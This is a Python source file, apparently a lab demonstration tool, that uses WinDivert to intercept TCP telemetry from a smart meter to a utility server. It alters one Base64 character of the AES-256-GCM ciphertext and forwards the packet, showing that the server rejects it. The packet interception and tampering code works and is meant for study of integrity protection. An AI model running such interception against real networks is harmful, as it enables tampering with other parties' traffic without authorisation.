"""
QuantumSecurity - Controlled Man-in-the-Middle (MitM) Attack Tool
=============================================================================
Security Scenario 3 Demonstration:
  Active Network Interception & Ciphertext Tampering against AES-256-GCM.

TARGET:
  TCP traffic from PYNQ-Z2 Smart Meter (192.168.2.99) to
  Utility Server (192.168.2.1:5000).

BEHAVIOR:
  1. Captures inbound TCP packets targeting port 5000 from 192.168.2.99 using WinDivert.
  2. Inspects payload for the real 'encrypted_telemetry' JSON application frame.
  3. Modifies exactly ONE Base64 character inside the "data" ciphertext field,
     strictly preserving packet length and JSON framing.
  4. Recalculates TCP/IP checksums and forwards the modified packet to the server.
  5. Attacks only the first matching telemetry packet (or specified count),
     then transparently forwards all subsequent traffic unmodified.
  6. Demonstrates that AES-256-GCM cryptographically rejects tampered ciphertext
     with InvalidTag on the Utility Server.

NOTE:
  Running WinDivert requires Windows Administrator privileges.
=============================================================================
"""

import argparse
import base64
import json
import os
import re
import sys
import time
from pathlib import Path

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))


def print_banner() -> None:
    banner_text = """
==============================================================================
         QUANTUMSECURITY - CONTROLLED MITM CIPHERTEXT TAMPERING
                      Scenario 3 Demonstration Tool
==============================================================================
"""
    print(banner_text.strip())
    print()


def tamper_telemetry_payload(
    payload_bytes: bytes,
    char_pos: int = 16
) -> tuple[bytes, dict]:
    """
    Locates the 'data' field inside an 'encrypted_telemetry' JSON message
    and modifies exactly one Base64 character at char_pos, preserving
    exact byte length and JSON framing.

    Returns:
        (tampered_bytes, info_dict)
    """
    try:
        text = payload_bytes.decode("utf-8")
    except UnicodeDecodeError:
        return payload_bytes, {"tampered": False, "reason": "Non-UTF8 payload"}

    # Match JSON structure with "type": "encrypted_telemetry" and "data": "..."
    if "encrypted_telemetry" not in text or '"data"' not in text:
        return payload_bytes, {"tampered": False, "reason": "Not an encrypted_telemetry packet"}

    # Use regex to find the data field value safely while preserving exact formatting
    pattern = re.compile(r'("data"\s*:\s*")([^"]+)(")')
    match = pattern.search(text)
    if not match:
        return payload_bytes, {"tampered": False, "reason": "Could not locate 'data' field regex match"}

    prefix = match.group(1)
    b64_data = match.group(2)
    suffix = match.group(3)

    if len(b64_data) < 20:
        return payload_bytes, {"tampered": False, "reason": "Ciphertext data field too short"}

    # Determine index to tamper
    idx = char_pos if (0 <= char_pos < len(b64_data)) else (len(b64_data) // 2)
    orig_char = b64_data[idx]

    # Swap character with another valid Base64 character
    if orig_char == "A":
        new_char = "B"
    elif orig_char == "a":
        new_char = "b"
    elif orig_char == "0":
        new_char = "1"
    elif orig_char == "/":
        new_char = "+"
    elif orig_char == "+":
        new_char = "/"
    elif orig_char.isupper():
        new_char = "A" if orig_char != "A" else "Z"
    elif orig_char.islower():
        new_char = "a" if orig_char != "a" else "z"
    else:
        new_char = "9"

    tampered_b64 = b64_data[:idx] + new_char + b64_data[idx + 1:]

    # Reconstruct text
    start_pos = match.start(2)
    end_pos = match.end(2)
    tampered_text = text[:start_pos] + tampered_b64 + text[end_pos:]
    tampered_bytes = tampered_text.encode("utf-8")

    info = {
        "tampered": True,
        "char_pos": idx,
        "orig_char": orig_char,
        "new_char": new_char,
        "orig_b64_snippet": b64_data[:24] + "..." + b64_data[-12:],
        "tampered_b64_snippet": tampered_b64[:24] + "..." + tampered_b64[-12:],
        "orig_len": len(payload_bytes),
        "tampered_len": len(tampered_bytes),
        "full_orig_b64": b64_data,
        "full_tampered_b64": tampered_b64,
    }

    return tampered_bytes, info


def run_mitm_attack(
    target_ip: str = "192.168.2.99",
    server_ip: str = "192.168.2.1",
    server_port: int = 5000,
    dry_run: bool = False,
    tamper_pos: int = 16,
    max_attack_count: int = 1
) -> None:
    """
    Main loop intercepting and tampering with packets using pydivert.
    """
    print_banner()

    try:
        import pydivert
    except ImportError:
        print("[ERROR] 'pydivert' is not installed in current Python environment.")
        print("        Install with: pip install pydivert")
        sys.exit(1)

    # WinDivert filter restricted to PYNQ -> Server TCP 5000
    filter_expr = f"tcp.DstPort == {server_port} and ip.SrcAddr == {target_ip}"

    print("[*] CONFIGURATION:")
    print(f"    Target Source (PYNQ)  : {target_ip}")
    print(f"    Server Destination    : {server_ip}:{server_port}")
    print(f"    Mode                  : {'DRY RUN (Inspect Only)' if dry_run else 'ACTIVE TAMPER (Scenario 3)'}")
    print(f"    Attack Count          : {max_attack_count} packet(s)")
    print(f"    Tamper Char Index     : {tamper_pos}")
    print(f"    WinDivert Filter      : {filter_expr}")
    print()

    print("[*] Initializing WinDivert network interception filter...")
    print("    [NOTE] Requires Administrator privileges on Windows.")
    print()

    tampered_count = 0
    total_packets_seen = 0
    telemetry_packets_seen = 0

    try:
        with pydivert.WinDivert(filter_expr) as w:
            print("[✓] WinDivert filter active and listening for PYNQ traffic.")
            print("    Waiting for Smart Meter to transmit encrypted telemetry...\n")

            for packet in w:
                total_packets_seen += 1

                # Check if packet contains payload
                if not packet.payload:
                    w.send(packet)
                    continue

                payload = bytes(packet.payload)

                # Check if this is an encrypted telemetry packet
                is_telemetry = (
                    b'"type"' in payload and
                    b'encrypted_telemetry' in payload and
                    b'"data"' in payload
                )

                if not is_telemetry:
                    # Handshake frame or other TCP data: forward immediately unchanged
                    w.send(packet)
                    continue

                telemetry_packets_seen += 1

                if dry_run:
                    print("=" * 78)
                    print(f"[*] [DRY RUN] Intercepted Encrypted Telemetry Packet #{telemetry_packets_seen}")
                    print(f"    From      : {packet.src_addr}:{packet.src_port} -> {packet.dst_addr}:{packet.dst_port}")
                    print(f"    Length    : {len(payload)} bytes")
                    try:
                        msg_snippet = payload.decode('utf-8', errors='replace').strip()
                        print(f"    Payload   : {msg_snippet[:100]}...")
                    except Exception:
                        pass
                    print("    Action    : Forwarded unmodified (Dry Run active).")
                    print("=" * 78)
                    w.send(packet)
                    continue

                if tampered_count < max_attack_count:
                    # Perform single-character tampering
                    tampered_payload, info = tamper_telemetry_payload(payload, char_pos=tamper_pos)

                    if info.get("tampered", False):
                        tampered_count += 1

                        print("=" * 78)
                        print(f"[!] >>> ATTACK EXECUTED: SCENARIO 3 TAMPERING (Packet #{telemetry_packets_seen}) <<<")
                        print("=" * 78)
                        print(f"[*] Intercepted legitimate telemetry packet from PYNQ ({packet.src_addr}):")
                        print(f"    Original Size       : {info['orig_len']} bytes")
                        print(f"    Original Ciphertext : {info['orig_b64_snippet']}")
                        print()
                        print(f"[*] Modifying ciphertext character at index {info['char_pos']}:")
                        print(f"    Character mutation  : '{info['orig_char']}' ──> '{info['new_char']}'")
                        print(f"    Tampered Ciphertext : {info['tampered_b64_snippet']}")
                        print(f"    Tampered Size       : {info['tampered_len']} bytes (Length strictly preserved)")
                        print()
                        print("[*] Recomputing TCP and IPv4 Checksums...")
                        packet.payload = tampered_payload
                        packet.recalculate_checksums()

                        print("[*] Forwarding tampered packet to Utility Server (192.168.2.1:5000)...")
                        w.send(packet, recalculate_checksum=True)

                        print()
                        print("[✓] PACKET INJECTED SUCCESSFULLY.")
                        print("    Expected Server Behavior:")
                        print("      - Server receives packet framing normally.")
                        print("      - AES-256-GCM decodes base64 and verifies authentication tag.")
                        print("      - Authentication tag verification FAILS (raised InvalidTag).")
                        print("      - Server rejects corrupted reading and prevents database ingestion.")
                        print("=" * 78)
                        print("\n[*] Switching to transparent pass-through mode for remaining traffic...\n")
                    else:
                        # Could not tamper (e.g. malformed), forward as is
                        w.send(packet)
                else:
                    # Pass-through mode after attack threshold reached
                    print(f"[*] [PASS-THROUGH] Forwarding legitimate telemetry #{telemetry_packets_seen} unmodified ({len(payload)} B)")
                    w.send(packet)

    except KeyboardInterrupt:
        print("\n[*] Interception stopped by user (Ctrl+C).")
    except Exception as e:
        err_msg = str(e)
        if "access" in err_msg.lower() or "privilege" in err_msg.lower() or "5" in err_msg:
            print("\n[ERROR] WinDivert requires Administrator privileges to access network packets.")
            print("        Please re-run this script in an elevated (Administrator) PowerShell / Command Prompt:")
            print(f"        .\\.venv\\Scripts\\python.exe integration\\mitm_attack.py {' '.join(sys.argv[1:])}\n")
        else:
            print(f"\n[ERROR] WinDivert error: {e}")
    finally:
        print()
        print("===== MITM SESSION SUMMARY =====")
        print(f"  Total Packets Captured   : {total_packets_seen}")
        print(f"  Telemetry Packets Seen   : {telemetry_packets_seen}")
        print(f"  Packets Tampered         : {tampered_count}")
        print(f"  Mode                     : {'DRY RUN' if dry_run else 'ACTIVE ATTACK'}")
        print("================================\n")


def parse_args():
    parser = argparse.ArgumentParser(
        description="QuantumSecurity - Controlled Scenario 3 MitM Packet Tampering Demonstration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dry-run mode: inspect encrypted telemetry without modifying
  python integration/mitm_attack.py --dry-run

  # Active attack: tamper 1st telemetry packet from PYNQ
  python integration/mitm_attack.py --target-ip 192.168.2.99 --server-port 5000

  # Custom character position in ciphertext
  python integration/mitm_attack.py --pos 24
        """
    )
    parser.add_argument(
        "--target-ip",
        default="192.168.2.99",
        help="Source IP address of PYNQ-Z2 Smart Meter (default: 192.168.2.99)"
    )
    parser.add_argument(
        "--server-ip",
        default="192.168.2.1",
        help="Destination IP address of Utility Server (default: 192.168.2.1)"
    )
    parser.add_argument(
        "--server-port",
        type=int,
        default=5000,
        help="TCP port of Utility Server (default: 5000)"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Inspect and log telemetry packets without modifying them"
    )
    parser.add_argument(
        "--pos",
        type=int,
        default=16,
        help="Character index inside 'data' ciphertext string to alter (default: 16)"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=1,
        help="Number of telemetry packets to tamper before switching to normal forwarding (default: 1)"
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    run_mitm_attack(
        target_ip=args.target_ip,
        server_ip=args.server_ip,
        server_port=args.server_port,
        dry_run=args.dry_run,
        tamper_pos=args.pos,
        max_attack_count=args.count
    )
